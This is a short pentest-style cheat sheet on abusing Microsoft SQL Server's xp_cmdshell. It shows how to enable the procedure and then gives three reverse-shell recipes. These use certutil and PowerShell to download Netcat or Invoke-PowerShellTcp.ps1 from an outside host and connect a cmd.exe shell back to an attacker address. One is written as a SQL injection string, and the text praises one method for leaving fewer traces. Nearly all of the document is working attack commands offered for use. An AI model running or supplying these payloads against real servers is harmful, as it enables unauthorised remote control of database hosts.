`xp_cmdshell` is an extended stored procedure provided by Microsoft SQL Server that allows system administrators to execute operating system commands directly from within an SQL query. 

It is disabled by default due to its powerful and potentially dangerous capabilities, but if enabled, it can be leveraged to execute arbitrary commands on the server's operating system. 


## Enable `xp_cmdshell`:

```sql
-- Enable advanced options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
-- Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Once enabled, you can execute commands directly from an SQL query:  


```sql
EXEC xp_cmdshell 'dir C:\\';  -- Lists directory contents of C:\
```


## Reverse Shell Examples

After enabling `xp_cmdshell`, you can download and execute Netcat on the target machine.  


### Example 1:

Download and execute a Netcat executable:

```sql
EXEC xp_cmdshell "certutil -urlcache -f http://example.com/nc64.exe c:/windows/temp/nc64.exe";
```

### Example 2:

Execute a PowerShell script to establish a reverse shell, which is generally more stealthy and effective:

```powershell
powershell.exe -c iex(iwr http://[IP]:[Port]/Invoke-PowerShellTcp.ps1 -UseBasicParsing); Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [Port]
```

This method leaves fewer traces and works most of the time.

### Example 3:

Chain SQL and PowerShell commands to fetch and execute Netcat, facilitating a reverse shell connection:

```sql
';EXECUTE xp_cmdshell 'powershell "Invoke-WebRequest -Uri https://github.com/int0x33/nc.exe/raw/master/nc64.exe -OutFile C:/windows/temp/nc64.exe"';-- and ';EXECUTE xp_cmdshell 'C:\windows\temp\nc64.exe 192.168.1.2 4444 -e cmd.exe';--
```
